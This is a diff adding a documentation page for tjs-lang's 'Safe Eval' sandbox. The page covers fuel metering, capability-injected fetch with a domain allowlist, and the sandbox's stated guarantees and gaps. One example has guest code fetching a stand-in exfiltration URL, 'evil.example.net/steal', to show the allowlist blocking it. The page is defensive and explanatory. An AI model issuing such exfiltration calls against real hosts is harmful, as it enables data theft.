@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <!-- NB: the body is NOT hidden until hydration. It used to be (body opacity 0 +
+       a 4s safety-net timeout), because an undefined custom element is
+       display:inline, so the pre-rendered page stacked as bare text and hydration
+       reflowed the whole thing. The cost was a blank screen for as long as the
+       bundle took — ~4.5s on a cheap phone, for content already in the HTML. The
+       tosi-doc-system:not(:defined) rules in the stylesheet now lay the static page
+       out as though the chrome were there, so hydration only ADDS the chrome and
+       nothing moves. Paint immediately; don't hide readable content. -->
+  <!-- Theme, applied BEFORE first paint. Now that we paint the static page rather
+       than hiding it, a dark-mode reader would otherwise get a flash of the light
+       theme until the bundle lands and sets body.darkmode. CSS alone can't do this:
+       an explicit theme choice lives in localStorage. Mirrors applyThemePrefs()
+       (doc-system.ts) — keep the two in step. Fails safe: any error leaves the
+       light default, exactly as before. -->
+  <script>
+    try {
+      var p = JSON.parse(localStorage.getItem('tosi-doc-system-prefs') || '{}')
+      var t = p.theme || 'system'
+      if (t === 'dark' || (t === 'system' && matchMedia('(prefers-color-scheme: dark)').matches))
+        document.documentElement.classList.add('darkmode')
+      if (p.highContrast) document.documentElement.classList.add('high-contrast')
+    } catch (e) {}
+  </script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link rel="stylesheet" href="../doc-system.css?v=c37dee9848e4" data-tosi-doc-system />
+  <title>Safe Eval — tjs-lang</title>
+  <meta name="description" content="Eval is too powerful to be allowed, which in practice means it is useless: no one sensible lets untrusted code run with the full authority of the page, so the…" />
+  <link rel="canonical" href="https://tjs.tosijs.net/safe-eval/" />
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="tjs-lang" />
+  <meta property="og:title" content="Safe Eval — tjs-lang" />
+  <meta property="og:description" content="Eval is too powerful to be allowed, which in practice means it is useless: no one sensible lets untrusted code run with the full authority of the page, so the…" />
+  <meta property="og:url" content="https://tjs.tosijs.net/safe-eval/" />
+  <meta name="twitter:card" content="summary" />
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Safe Eval","description":"Eval is too powerful to be allowed, which in practice means it is useless: no one sensible lets untrusted code run with the full authority of the page, so the…","url":"https://tjs.tosijs.net/safe-eval/","inLanguage":"en","isPartOf":{"@type":"WebSite","name":"tjs-lang","url":"https://tjs.tosijs.net"}}</script>
+  <link rel="icon" href="../favicon.svg" />
+</head>
+<body>
+  <tosi-doc-system docs="../docs.json?v=60ed83cc4679" config="{&quot;projectName&quot;:&quot;tjs-lang&quot;}">
+  <article class="doc-content">
+<!--{"parent": "ajs.md", "order": 2}--><h1>Safe Eval</h1>
+<p><code>eval</code> is too powerful to be allowed, which in practice means it is useless: no one sensible
+lets untrusted code run with the full authority of the page, so the most dynamic feature in the
+language goes unused. The goal was the opposite trade — make something <strong>as powerful as
+possible while still being safe</strong> — and what came out is safer than the code around it. The
+code that calls it is not guaranteed to halt, and neither is the code it calls; Safe Eval is.
+So eval goes from the most dangerous execution environment in a project to the least dangerous.</p>
+<p>It is the same machine as AJS — a fuel-metered VM with no ambient authority — exposed as the
+two calls JavaScript already has: <code>eval()</code> becomes <code>Eval</code>, <code>new Function()</code> becomes
+<code>SafeFunction</code>.</p>
+<h2><code>Eval</code> — run code once</h2>
+<p><code>Eval</code> runs a snippet of code in the sandbox and returns what it produced, with the fuel it
+used. The code sees only the <code>context</code> you hand it.</p>
+<pre><code class="language-js">import { Eval, SafeFunction } from &#39;tjs-lang/eval&#39;
+
+const { result, fuelUsed } = await Eval({ code: &#39;a + b&#39;, context: { a: 1, b: 2 } })
+console.log(result) // → 3
+console.log(fuelUsed &gt; 0) // → true
+</code></pre>
+<p>Only context keys the code uses as names become variables, and a key never replaces a
+builtin: a context entry called <code>Math</code> or <code>NaN</code> is ignored rather than rebinding it. A local
+the code declares (<code>let a = …</code> or <code>const a = …</code>) shadows a context key of the same name.</p>
+<h2><code>SafeFunction</code> — compile once, call many times</h2>
+<p><code>SafeFunction</code> turns a function body into a callable. Its parameters are <strong>names</strong>, and each
+call returns the same shape as <code>Eval</code>.</p>
+<pre><code class="language-js">const add = await SafeFunction({ params: [&#39;a&#39;, &#39;b&#39;], body: &#39;return a + b&#39; })
+console.log((await add(1, 2)).result) // → 3
+console.log((await add(20, 22)).result) // → 42
+</code></pre>
+<h2>Nothing runs forever</h2>
+<p>Every step costs fuel, and a run that spends its budget is stopped. The failure comes back as a
+value — an <code>error</code> alongside the result — rather than as an exception the caller has to catch.</p>
+<pre><code class="language-js">const runaway = await Eval({
+  code: &#39;let i = 0\nwhile (true) { i = i + 1 }\nreturn i&#39;,
+  fuel: 100,
+})
+console.log(runaway.error.message) // → Out of Fuel
+</code></pre>
+<p>Creating a <code>SafeFunction</code> is the exception: a body that does not parse, or is over the source
+size limit, throws when you create it — before any untrusted code has run.</p>
+<h2>Nothing reaches out unless you allow it</h2>
+<p>The sandbox has no network, no file system and no globals. Network access goes through the
+<code>httpFetch</code> atom, and only if you inject a <code>fetch</code> capability — so the untrusted code gets
+<em>your</em> <code>fetch</code>, with whatever rules you put in it.</p>
+<p>A <code>fetch</code> capability returns the response <strong>body</strong> as plain data, not a <code>Response</code>: everything
+a capability returns is copied across a boundary before the guest sees it, so the guest never
+holds a live host object.</p>
+<pre><code class="language-js">const allowed = [&#39;api.example.com&#39;]
+const safeFetch = (url, init) =&gt; {
+  if (!allowed.includes(new URL(url).host)) {
+    throw new Error(`Domain not allowed: ${new URL(url).host}`)
+  }
+  return fetch(url, init).then((r) =&gt; r.json()) // the BODY, not the Response
+}
+
+const cheap = await Eval({
+  code: `
+    let products = httpFetch({ url: &#39;https://api.example.com/products&#39; })
+    return products.filter(x =&gt; x.price &lt; budget)
+  `,
+  context: { budget: 100 },
+  capabilities: { fetch: safeFetch },
+})
+console.log(cheap.result) // → [{&quot;name&quot;:&quot;widget&quot;,&quot;price&quot;:40}]
+
+const blocked = await Eval({
+  code: &quot;return httpFetch({ url: &#39;https://evil.example.net/steal&#39; })&quot;,
+  capabilities: { fetch: safeFetch },
+})
+console.log(blocked.error.message) // → Domain not allowed: evil.example.net
+</code></pre>
+<h2>What the sandbox guarantees, and what it does not</h2>
+<p>Be precise here: a security claim you cannot cash is worse than none.</p>
+<ul>
+<li><strong>Termination is guaranteed, not decided.</strong> Fuel metering sidesteps the halting problem
+rather than solving it: every step costs fuel and execution stops when it runs out, so a
+program either finishes or is stopped. A wall-clock timeout (by default ten milliseconds per
+unit of fuel) backs it up, and a stopped run cancels any request it had in flight.</li>
+<li><strong>Bounded memory.</strong> The VM caps how much the guest can hold live at once (64 MB by default),
+separately from fuel, which bounds only how much work it does.</li>
+<li><strong>Bounded input.</strong> Source over 8 KB is refused <em>before</em> it is transpiled, because
+transpiling runs before fuel and the timeout apply. Raise or disable the cap with
+<code>maxSourceBytes</code> for trusted source you pass in; for source the agent builds at run time
+(<code>runCode</code>, <code>transpileCode</code>) it can only be lowered, since that text may come from a model. Serving untrusted callers? Have them send an AST
+(transpiled on their side) and run it with <code>tjs-lang/vm-ast</code>, which contains no parser.</li>
+<li><strong>No ambient authority.</strong> The VM has no IO by default; the only way out is a capability you
+inject, and every atom that touches one is tagged as IO — a tagging that is itself tested, so
+the list of ways out can be enumerated.</li>
+<li><strong>The guest holds data, not references.</strong> Capability returns cross a <code>structuredClone</code>
+boundary, so guest code cannot reach a host object or mutate one you still hold. A value that
+cannot be copied — a <code>Response</code>, a function, an object with getters — is rejected rather
+than passed through.</li>
+<li><strong>Layered and tested — not formally proven.</strong> These properties are structural and could in
+principle be proven; today they are enforced by construction and covered by an adversarial
+test suite.</li>
+<li><strong>Known gap: cross-endpoint amplification.</strong> Recursive agent calls are bounded by a depth
+header (<code>X-Agent-Depth</code>, max 10), but that is <strong>cooperative</strong> — it stops accidental loops,
+not an adversarial endpoint that drops the header. Rate-limit completely open endpoints.</li>
+<li><strong>Out of scope:</strong> timing side channels, JavaScript-engine JIT bugs and memory-level attacks.
+A JavaScript-in-JavaScript sandbox cannot address those; put process isolation underneath if
+your threat model includes them.</li>
+</ul>
+<p><img src="../docs/diagrams/safe-eval.svg" alt="Safe Eval: capability-based security"></p>
+
+  </article>
+  <nav class="doc-nav" aria-label="Documentation">
+  <ul>
+    <li><a class="doc-link" href="../">TJS Platform</a></li>
+    <li><details><summary><a class="doc-link" href="../tjs/">TJS: Typed JavaScript</a></summary>
+    <ul>
+      <li><details><summary><a class="doc-link" href="../tjs-examples/">TJS Interactive Examples</a></summary>
+      <ul>
+        <li><details><summary><a class="doc-link" href="../tjs-featured/">Featured</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../wasm-starfield/">Starfield</a></li>
+          <li><a class="doc-link" href="../tjs-grammar-demo/">TJS Grammar Reference</a></li>
+          <li><a class="doc-link" href="../wasm-vector-search/">Vector Search Benchmark</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-basics/">Basics</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../hello-tjs/">Hello TJS</a></li>
+          <li><a class="doc-link" href="../required-vs-optional/">Required vs Optional</a></li>
+          <li><a class="doc-link" href="../object-types/">Object Types</a></li>
+          <li><a class="doc-link" href="../array-types/">Array Types</a></li>
+          <li><a class="doc-link" href="../given-dispatch/">Control Flow: given</a></li>
+          <li><a class="doc-link" href="../dictionary-defaults-example/">Dictionary Defaults</a></li>
+          <li><a class="doc-link" href="../const-and-bang/">const! and Bang Access</a></li>
+          <li><a class="doc-link" href="../honest-equality/">Honest Equality</a></li>
+          <li><a class="doc-link" href="../polymorphic-functions/">Polymorphic Functions</a></li>
+          <li><a class="doc-link" href="../js-footgun-fixes/">JS Footgun Fixes</a></li>
+          <li><a class="doc-link" href="../polymorphic-constructors/">Polymorphic Constructors</a></li>
+          <li><a class="doc-link" href="../safety-validation/">Safety &amp; Validation</a></li>
+          <li><a class="doc-link" href="../better-classes/">Better Classes</a></li>
+          <li><a class="doc-link" href="../local-extensions/">Local Class Extensions</a></li>
+          <li><a class="doc-link" href="../safer-code/">Safer Code</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-patterns/">Patterns</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../higher-order-functions/">Higher-Order Functions</a></li>
+          <li><a class="doc-link" href="../async-functions/">Async Functions</a></li>
+          <li><a class="doc-link" href="../error-handling/">Error Handling</a></li>
+          <li><a class="doc-link" href="../error-history/">Flight Recorder</a></li>
+          <li><a class="doc-link" href="../schema-validation/">Schema Validation</a></li>
+          <li><a class="doc-link" href="../date-formatting-with-import/">Date Formatting (with import)</a></li>
+          <li><a class="doc-link" href="../local-module-imports/">Local Module Imports</a></li>
+          <li><a class="doc-link" href="../lodash-utilities-with-import/">Lodash Utilities (with import)</a></li>
+          <li><a class="doc-link" href="../wasm-basics/">Inline WASM</a></li>
+          <li><a class="doc-link" href="../wasm-simd/">WASM SIMD</a></li>
+          <li><a class="doc-link" href="../wasm-memory/">WASM Memory</a></li>
+          <li><a class="doc-link" href="../wasm-functions/">WASM Functions (reusable kernels)</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-advanced/">Advanced</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../the-universal-endpoint/">The Universal Endpoint</a></li>
+          <li><a class="doc-link" href="../inline-tests-test-private-functions/">Inline Tests: Test Private Functions</a></li>
+          <li><a class="doc-link" href="../predicate-types/">Predicate Types</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-fullstack/">Full Stack</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../full-stack-demo-user-service/">Full-Stack Demo: User Service</a></li>
+          <li><a class="doc-link" href="../full-stack-demo-client-app/">Full-Stack Demo: Client App</a></li>
+          <li><a class="doc-link" href="../full-stack-demo-todo-api/">Full-Stack Demo: Todo API</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-unbundled/">Unbundled</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../react-todo-comparison/">React Todo (Comparison)</a></li>
+          <li><a class="doc-link" href="../tosijs-todo/">tosijs Todo App</a></li>
+          <li><a class="doc-link" href="../cdn-hints/">CDN Hints (overriding the default)</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../tjs-wasmlib/">WASM Libraries</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../wasm-library-author/">WASM Library: SIMD Linalg</a></li>
+          <li><a class="doc-link" href="../wasm-library-consumer/">Using a WASM Library</a></li>
+        </ul>
+        </details></li>
+      </ul>
+      </details></li>
+      <li><a class="doc-link" href="../DOCS-TJS/">TJS: Typed JavaScript</a></li>
+      <li><a class="doc-link" href="../TJS-FOR-JS/">TJS for JavaScript Programmers</a></li>
+      <li><a class="doc-link" href="../footguns/">JS Footguns That TJS Quietly Fixes</a></li>
+      <li><a class="doc-link" href="../DOCS-WASM/">WASM in TJS</a></li>
+      <li><a class="doc-link" href="../WASM-QUICKSTART/">WASM Quick Start</a></li>
+      <li><a class="doc-link" href="../playground-imports/">Playground Imports</a></li>
+      <li><a class="doc-link" href="../tosijs-schema/">Context: Working with tosijs-schema</a></li>
+      <li><a class="doc-link" href="../performance/">TJS Performance Guide</a></li>
+    </ul>
+    </details></li>
+    <li><details open><summary><a class="doc-link" href="../ajs/">AJS (.ajs) - A Better JavaScript for AI Agents</a></summary>
+    <ul>
+      <li><a class="doc-link" href="../DOCS-AJS/">AJS: The Agent Language</a></li>
+      <li><a class="doc-link current" href="../safe-eval/" aria-current="page">Safe Eval</a></li>
+      <li><a class="doc-link" href="../ajs-llm-prompt/">AJS LLM System Prompt</a></li>
+      <li><details><summary><a class="doc-link" href="../ajs-examples/">AJS Examples</a></summary>
+      <ul>
+        <li><details><summary><a class="doc-link" href="../ajs-featured/">Featured</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../llm-api-data/">LLM + API Data</a></li>
+          <li><a class="doc-link" href="../fuel-limits/">Fuel Limits</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ajs-basics/">Basics</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../hello-world/">Hello World</a></li>
+          <li><a class="doc-link" href="../math-operations/">Math Operations</a></li>
+          <li><a class="doc-link" href="../conditional-logic/">Conditional Logic</a></li>
+          <li><a class="doc-link" href="../loop-filter/">Loop &amp; Filter</a></li>
+          <li><a class="doc-link" href="../string-processing/">String Processing</a></li>
+          <li><a class="doc-link" href="../json-processing/">JSON Processing</a></li>
+          <li><a class="doc-link" href="../ajs-error-handling/">Error Handling</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ajs-api/">APIs</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../weather-api/">Weather API</a></li>
+          <li><a class="doc-link" href="../itunes-search/">iTunes Search</a></li>
+          <li><a class="doc-link" href="../github-repos/">GitHub Repos</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ajs-llm/">LLMs</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../llm-chat/">LLM Chat</a></li>
+          <li><a class="doc-link" href="../llm-summarizer/">LLM Summarizer</a></li>
+          <li><a class="doc-link" href="../llm-structured-output/">LLM Structured Output</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ajs-advanced/">Advanced</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../llm-with-tool/">LLM with Tool</a></li>
+          <li><a class="doc-link" href="../multi-agent-pipeline/">Multi-Agent Pipeline</a></li>
+          <li><a class="doc-link" href="../vision-ocr/">Vision: OCR</a></li>
+          <li><a class="doc-link" href="../vision-classification/">Vision: Classification</a></li>
+          <li><a class="doc-link" href="../llm-code-solver/">LLM Code Solver</a></li>
+          <li><a class="doc-link" href="../llm-code-generator/">LLM Code Generator</a></li>
+        </ul>
+        </details></li>
+      </ul>
+      </details></li>
+      <li><a class="doc-link" href="../patterns/">AJS Patterns</a></li>
+      <li><a class="doc-link" href="../universal-endpoint/">The universal endpoint: isomorphic atoms, one security model</a></li>
+      <li><a class="doc-link" href="../ajs-native-vm/">AJS Native VM (Rust → wasm) — post-1.0 direction</a></li>
+      <li><a class="doc-link" href="../lm-studio-setup/">Running the LLM test suite (LM Studio setup)</a></li>
+      <li><a class="doc-link" href="../mlx-setup/">MLX as the local-AI harness</a></li>
+      <li><a class="doc-link" href="../runtime/">seq (Sequence)</a></li>
+      <li><a class="doc-link" href="../index/">Store Module</a></li>
+      <li><a class="doc-link" href="../interface/">Store Interface</a></li>
+      <li><a class="doc-link" href="../memory/">In-Memory Store</a></li>
+      <li><a class="doc-link" href="../indexeddb/">IndexedDB Store</a></li>
+    </ul>
+    </details></li>
+    <li><details><summary><a class="doc-link" href="../TJS-FOR-TS/">TJS for TypeScript Programmers</a></summary>
+    <ul>
+      <li><details><summary><a class="doc-link" href="../ts-examples/">TypeScript Examples</a></summary>
+      <ul>
+        <li><details><summary><a class="doc-link" href="../ts-intro/">Introduction</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../ts-hello-typescript/">Hello TypeScript</a></li>
+          <li><a class="doc-link" href="../ts-multiple-functions/">Multiple Functions</a></li>
+          <li><a class="doc-link" href="../ts-type-transformation/">Type Transformation</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ts-validation/">Validation</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../ts-embedded-tests/">Embedded Tests</a></li>
+          <li><a class="doc-link" href="../ts-runtime-validation/">Runtime Validation</a></li>
+          <li><a class="doc-link" href="../ts-object-validation/">Object Validation</a></li>
+          <li><a class="doc-link" href="../ts-optional-parameters/">Optional Parameters</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ts-patterns/">Patterns</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../ts-array-operations/">Array Operations</a></li>
+          <li><a class="doc-link" href="../ts-nested-objects/">Nested Objects</a></li>
+          <li><a class="doc-link" href="../ts-union-types/">Union Types</a></li>
+        </ul>
+        </details></li>
+        <li><details><summary><a class="doc-link" href="../ts-advanced/">Advanced</a></summary>
+        <ul>
+          <li><a class="doc-link" href="../ts-generic-functions/">Generic Functions</a></li>
+          <li><a class="doc-link" href="../ts-async-functions/">Async Functions</a></li>
+          <li><a class="doc-link" href="../ts-classes/">Classes</a></li>
+          <li><a class="doc-link" href="../ts-the-full-picture/">The Full Picture</a></li>
+        </ul>
+        </details></li>
+      </ul>
+      </details></li>
+    </ul>
+    </details></li>
+    <li><details><summary><a class="doc-link" href="../the-tjs-language/">The TJS Language</a></summary>
+    <ul>
+      <li><a class="doc-link" href="../why-tjs/">Why TJS</a></li>
+      <li><a class="doc-link" href="../PRINCIPLES/">Design Principles &amp; Invariants</a></li>
+      <li><a class="doc-link" href="../declarations/">Declarations</a></li>
+      <li><a class="doc-link" href="../CLAUDE-TJS-SYNTAX/">TJS Syntax Reference</a></li>
+      <li><a class="doc-link" href="../dictionary-defaults/">Dictionary Defaults (Merge-on-Partial Object Arguments)</a></li>
+      <li><a class="doc-link" href="../type-identity/">Type identity: who answers "does this value satisfy this type?"</a></li>
+      <li><a class="doc-link" href="../runtime-fusion/">Runtime fusion: what may be shared between TJS modules, and what may not</a></li>
+      <li><a class="doc-link" href="../type-system-north-star/">North star: JSON-Schema + predicates as the single source of truth for types</a></li>
+      <li><a class="doc-link" href="../function-predicate-design/">FunctionPredicate: Design Notes</a></li>
+      <li><a class="doc-link" href="../case-study-switch/">Case study: fixing switch</a></li>
+      <li><a class="doc-link" href="../parser-primitives/">Small scoped parsers, not a rewrite</a></li>
+      <li><a class="doc-link" href="../ambient-contracts/">Ambient Contracts — probe reality, derive verified predicate contracts</a></li>
+      <li><a class="doc-link" href="../native-engine-integration/">Native Engine Integration: TJS in V8 or JavaScriptCore</a></li>
+      <li><a class="doc-link" href="../CONTEXT/">tjs-lang Technical Context</a></li>
+    </ul>
+    </details></li>
+    <li><details><summary><a class="doc-link" href="../typescript-good-bad-ugly/">TypeScript: The Good, the Bad, and the Ugly</a></summary>
+    <ul>
+      <li><a class="doc-link" href="../tjs-vs-typescript/">TJS vs TypeScript vs JavaScript</a></li>
+      <li><a class="doc-link" href="../generic-dts-design/">Generic .d.ts Emission: Design Notes</a></li>
+      <li><a class="doc-link" href="../postmortem-ts-emitter/">Post-mortem: we spent seven months testing TypeScript's compiler</a></li>
+    </ul>
+    </details></li>
+    <li><a class="doc-link" href="../CHANGELOG/">Changelog</a></li>
+    <li><a class="doc-link" href="../PLAN/">TJS Roadmap</a></li>
+    <li><a class="doc-link" href="../ASSUMPTIONS/">Assumptions ledger</a></li>
+    <li><a class="doc-link" href="../MANIFESTO-BUILDER/">Applied Laziness: The "Zero-Infrastructure" Stack</a></li>
+    <li><a class="doc-link" href="../MANIFESTO-ENTERPRISE/">Governance: Safe Execution of Untrusted Logic</a></li>
+    <li><a class="doc-link" href="../benchmarks/">TJS Benchmarks</a></li>
+  </ul>
+  </nav>
+
+  </tosi-doc-system>
+  <script src="../iife.js?v=c37dee9848e4"></script>
+</body>
+</html>
